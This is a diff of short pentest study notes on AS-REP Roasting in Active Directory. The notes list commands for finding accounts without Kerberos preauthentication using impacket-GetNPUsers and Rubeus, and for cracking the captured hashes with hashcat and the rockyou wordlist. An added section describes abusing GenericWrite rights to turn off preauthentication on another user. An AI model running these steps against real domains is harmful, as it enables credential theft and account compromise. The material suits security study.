@@ -1,5 +1,7 @@
 "Do not require Kerberos preauthentication is disabled" by default.
 
+
+=============== KALI ==========
 # Identify vuln users:
 $ impacket-GetNPUsers -dc-ip 10.0.0.2 superalex.sec/user01
 
@@ -20,3 +22,7 @@ import-module powerview.ps1
 
 .\Rubeus.exe asreproast /nowrap
 $ sudo hashcat -m 18200 hashes2.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+===== Targeted AS-REP Roasting ====
+Check for GenericWrite or GenericAll permissions on another AD user account. If have, we modify the User Account Control value of the user to not require Kerberos preauthentication.
